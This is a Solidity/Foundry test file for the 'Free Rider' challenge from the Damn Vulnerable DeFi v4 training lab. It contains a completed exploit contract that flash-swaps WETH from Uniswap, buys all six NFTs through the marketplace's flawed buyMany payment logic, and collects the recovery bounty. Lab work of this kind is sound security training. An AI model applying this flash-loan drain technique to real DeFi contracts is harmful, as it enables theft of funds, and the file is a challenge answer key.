// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";


contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        FreeRiderAttack attack = new FreeRiderAttack(recoveryManager, uniswapV2Router, marketplace, token, uniswapV2Factory, weth);
        attack.flashswap();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

contract FreeRiderAttack {
    using Address for address;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableToken dvt;
    WETH weth;
    address player;

    constructor(FreeRiderRecoveryManager _recoveryManager, IUniswapV2Router02 _uniswapV2Router, FreeRiderNFTMarketplace _marketplace, DamnValuableToken _dvt, IUniswapV2Factory _uniswapV2Factory, WETH _weth) payable {
        recoveryManager = _recoveryManager;
        uniswapV2Router = _uniswapV2Router;
        marketplace = _marketplace;
        dvt = _dvt;
        uniswapV2Factory = _uniswapV2Factory;
        weth = _weth;
        player = msg.sender;
    }
    
    function flashswap() public {
        address pair = uniswapV2Factory.getPair(address(weth), address(dvt));
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint amount0Out = token0 == address(weth) ? 15e18 : 0;
        uint amount1Out = token1 == address(weth) ? 15e18 : 0;

        bytes memory data = abi.encode(address(weth), 15e18, address(pair));   // token we wanna borrow, and amount
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (address tokenToBorrow, uint amount, address pair )= abi.decode(data, (address, uint, address));
        console.log("Amount is:", amount);
        tokenToBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
        console.log("ETH BALANCE OF CA:", address(this).balance);
        uint256[] memory nftsArray = new uint256[](6);
        for (uint i = 0; i < 6; i++) {
            nftsArray[i] = i;
        }
        marketplace.buyMany{value: amount}(nftsArray);

        nft = marketplace.token();
        for (uint i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
        }

        uint256 fee = ((amount * 3) / 997) + 1;
        address(weth).call{value: amount + fee}(""); //now we wrap the ether to WETH
        console.log("FEE AND AMOUNT ", amount + fee);
        IERC20(tokenToBorrow).transfer(address(pair), amount + fee);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive () external payable {}
}
